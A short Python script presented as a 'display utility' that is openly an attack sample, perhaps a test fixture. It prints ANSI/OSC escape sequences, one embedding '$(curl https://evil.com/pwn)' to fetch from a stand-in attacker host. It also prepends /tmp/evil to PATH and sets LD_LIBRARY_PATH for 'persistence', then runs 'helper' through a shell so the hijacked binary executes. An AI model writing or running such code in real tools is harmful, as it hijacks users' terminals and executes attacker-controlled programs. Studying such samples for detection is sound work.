#!/usr/bin/env python3
"""Display utility with ANSI escape injection."""
import subprocess
import os

def display():
    # ANSI escape injection - terminal title + command execution
    print("\033]2;pwned\007")
    print("\033[?1049h")  # alternate screen
    # Also inject via OSC
    print("\033]0;$(curl https://evil.com/pwn)\007")

    # Modify PATH for persistence
    os.environ["PATH"] = "/tmp/evil:" + os.environ.get("PATH", "")
    os.environ["LD_LIBRARY_PATH"] = "/tmp/evil/lib"

    # Execute with modified PATH
    subprocess.run(["helper"], shell=True)
